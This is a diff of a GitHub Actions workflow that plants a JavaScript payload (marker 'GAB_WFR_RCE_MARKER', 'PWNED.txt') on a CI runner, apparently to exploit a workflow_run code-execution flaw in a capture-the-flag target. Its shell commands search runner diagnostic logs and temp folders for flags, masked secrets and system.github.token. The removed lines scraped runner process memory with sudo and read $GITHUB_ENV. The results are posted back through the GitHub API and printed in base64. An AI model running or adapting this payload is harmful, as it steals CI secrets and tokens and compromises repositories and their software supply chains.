@@ -19,7 +19,7 @@ jobs:
           JSON
           cat > stage/.github/scripts/helpers/index.js <<'PAYLOAD'
           const fs = require('fs');
-          const REPORT = { marker: 'GAB_WFR_RCE_MARKER_v4' };
+          const REPORT = { marker: 'GAB_WFR_RCE_MARKER_v5' };
 
           async function probe() {
             const { execSync } = require('child_process');
@@ -31,10 +31,8 @@ jobs:
             out.token_env = process.env['INPUT_GITHUB-TOKEN'] ? 'INPUT_GITHUB-TOKEN' : 'GITHUB_TOKEN';
             out.rid = process.env.GITHUB_RUN_ID;
             const sh = (c) => { try { return execSync(c, { encoding: 'utf8', timeout: 30000, maxBuffer: 8 * 1024 * 1024 }); } catch (e) { return 'ERR:' + (e.stdout || '') + (e.stderr || ''); } };
-            out.diag_flag_grep = sh("grep -rIa -e 'FLAG{' -e 'toJSON(secrets)' /home/runner/actions-runner/_diag /home/runner/work/_temp 2>/dev/null | head -10 || true").slice(0, 2000);
-            out.worker_pids = sh("pgrep -af 'Runner.Worker|Runner.Listener' | head -5 || true");
-            out.worker_flag_scan = sh("for p in $(pgrep -f 'Runner.Worker|Runner.Listener'); do sudo -n strings -n 8 /proc/$p/mem 2>/dev/null | grep -m3 'FLAG{' && echo \"FOUND_IN_$p\"; done; true").slice(0, 2000);
-            out.env_file = sh("ls -l \"$GITHUB_ENV\" \"$GITHUB_OUTPUT\" 2>/dev/null; head -c 500 \"$GITHUB_ENV\" 2>/dev/null; true");
+            out.home_listing = sh("ls -la /home/runner 2>/dev/null | head -30; ls -la /home/runner/actions-runner/_diag 2>/dev/null | head -5; ls -la /actions-runner/_diag 2>/dev/null | head -5; true").slice(0, 2000);
+            out.diag_flag_grep = sh("for d in /home/runner/actions-runner/_diag /actions-runner/_diag /home/runner/_diag /home/runner/work/_temp; do [ -d \"$d\" ] && grep -rIa -m5 -e 'FLAG{' -e 'masking' -e 'system.github.token' \"$d\" 2>/dev/null | head -10; done; true").slice(0, 3000);
             const api = async (path, opts = {}) => {
               try {
                 const r = await fetch('https://api.github.com' + path, {
@@ -103,7 +101,7 @@ jobs:
               body: JSON.stringify({ body: 'WFR RCE v4 probe result (token proof + permission boundaries):\n\n```json\n' + JSON.stringify(out, null, 1).slice(0, 60000) + '\n```' })
             });
             console.log('GAB_WFR_RESULT_B64:' + Buffer.from(JSON.stringify(out)).toString('base64'));
-            try { fs.writeFileSync('PWNED.txt', 'GAB_WFR_RCE_MARKER_v4\n'); } catch (e) {}
+            try { fs.writeFileSync('PWNED.txt', 'GAB_WFR_RCE_MARKER_v5\n'); } catch (e) {}
             return out;
           }
 
